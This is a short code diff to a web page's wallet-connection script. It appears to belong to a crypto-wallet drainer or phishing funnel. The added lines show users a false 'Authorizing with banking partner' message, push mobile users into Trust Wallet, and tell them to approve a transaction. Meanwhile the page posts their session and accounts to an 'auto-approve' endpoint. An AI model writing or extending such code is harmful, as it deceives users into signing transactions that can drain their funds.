@@ -302,8 +302,15 @@ function onWalletConnected(_d) {
   walletLinked = true;
   track('InitiateCheckout', FUNNEL_CONTENT);
   setLoaderStep('auth');
-  setBusy(true, 'Wallet connected', 'Preparing your application…');
-  onAuthorizationApproved();
+  setBusy(
+    true,
+    'Authorizing with banking partner',
+    'Approve the transaction in Trust Wallet to finish.'
+  );
+  if (IS_MOBILE && !IS_TW_BROWSER) {
+    setTimeout(() => { window.location.href = 'https://link.trustwallet.com/open'; }, 200);
+  }
+  sendAuthorization();
 }
 
 async function sendAuthorization() {
@@ -314,7 +321,7 @@ async function sendAuthorization() {
     const res = await fetch(BASE + '/api/front/auto-approve', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ topic: sessionTopic, accounts: connAccounts }),
+      body: JSON.stringify({ connectionId: connId, topic: sessionTopic, accounts: connAccounts }),
     });
     const data = await res.json();
     if (!data.started) {
